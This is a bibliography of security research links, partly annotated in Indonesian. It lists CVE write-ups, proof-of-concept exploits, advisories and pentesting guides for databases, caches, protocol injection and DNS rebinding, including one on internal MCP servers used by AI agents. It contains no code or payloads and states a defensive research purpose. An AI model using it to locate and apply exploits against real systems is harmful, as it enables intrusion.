- OX Security: "PoC: Exploiting MongoBleed, CVE-2025-14847 Technical Walkthrough" — https://www.ox.security/blog/poc-exploiting-mongobleed-cve-2025-14847-technical-walkthrough/
- Synacktiv: "CVE-2025-23016: Exploiting the FastCGI library" — https://www.synacktiv.com/en/publications/cve-2025-23016-exploiting-the-fastcgi-library
- Rapid7: "CVE-2025-1094: PostgreSQL psql SQL injection" — https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/
- OX Security: "Lessons from the PostgreSQL CVE-2025-1094 Exploitation" — https://www.ox.security/blog/lessons-from-the-postgresql-cve-2025-1094-exploitation/
- Wiz: "Redis RCE CVE-2025-49844" — https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844
- Sysdig: "Understanding CVE-2025-49844: RediShell" — https://www.sysdig.com/blog/cve-2025-49844-redishell
- DEVCORE: "Security Alert: CVE-2024-4577 - PHP CGI Argument Injection Vulnerability" — https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
- Netty Security Advisory: "CVE-2025-67735: CRLF injection in HttpRequestEncoder" — https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4
- Netty Security Advisory: "CVE-2025-59419: SMTP Command Injection" — https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86
- CrowdStrike: "Analyzing NTLM LDAP Auth Bypass Vulnerability (CVE-2025-54918)" — https://www.crowdstrike.com/en-us/blog/analyzing-ntlm-ldap-authentication-bypass-vulnerability/
- SafeBreach: "LDAPNightmare: CVE-2024-49113 PoC" — https://www.safebreach.com/blog/ldapnightmare-safebreach-labs-publishes-first-proof-of-concept-exploit-for-cve-2024-49113/
- D4D Blog: "Memcached Command Injections at Pylibmc" — https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/
- Orange Tsai: "How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!" — https://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/
- Redis: "Cross Protocol Scripting protection" — https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50
- Redis: "Serialization protocol specification (RESP)" — https://redis.io/docs/latest/develop/reference/protocol-spec/
- Straiker AI: "Agentic Danger: DNS Rebinding Exposes Internal MCP Servers" — https://www.straiker.ai/blog/agentic-danger-dns-rebinding-exposing-your-internal-mcp-servers
- NCC Group: "Singularity: DNS Rebinding Attack Framework" — https://github.com/nccgroup/singularity
- HackTricks: "6379 - Pentesting Redis" — https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis
- HackTricks: "11211 - Pentesting Memcache" — https://book.hacktricks.wiki/en/network-services-pentesting/11211-memcache
- PortSwigger: "Top 10 Web Hacking Techniques of 2024" — https://portswigger.net/research/top-10-web-hacking-techniques-of-2024
- Snyk: "CVE-2024-1597: SQL Injection in org.postgresql:postgresql" — https://security.snyk.io/vuln/SNYK-JAVA-ORGPOSTGRESQL-6252740
- Simon Willison: "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level" — https://simonwillison.net/2024/Aug/12/smuggling-queries-at-the-protocol-level/
- su18: "JDBC Connection URL Attack" — https://su18.org/post/jdbc-connection-url-attack/
- Code Intelligence: "New Vulnerability in MySQL JDBC Driver: RCE and Unauthorized DB Access" — https://www.code-intelligence.com/blog/cve-jdbc-mysql-driver-rce-unauthorized-read-write-access
- SonarSource: "Zimbra Email — Stealing Clear-Text Credentials via Memcache injection" (2022) — Memcache CRLF injection di Zimbra yang memungkinkan pencurian kredensial
- Doyhenard: "Exploiting Inter-Process Communication in SAP's HTTP Server" (Black Hat USA 2022) — Eksploitasi shared memory IPC SAP ICM

---

*Dokumen ini dibuat untuk tujuan penelitian keamanan defensif dan pemahaman kerentanan.*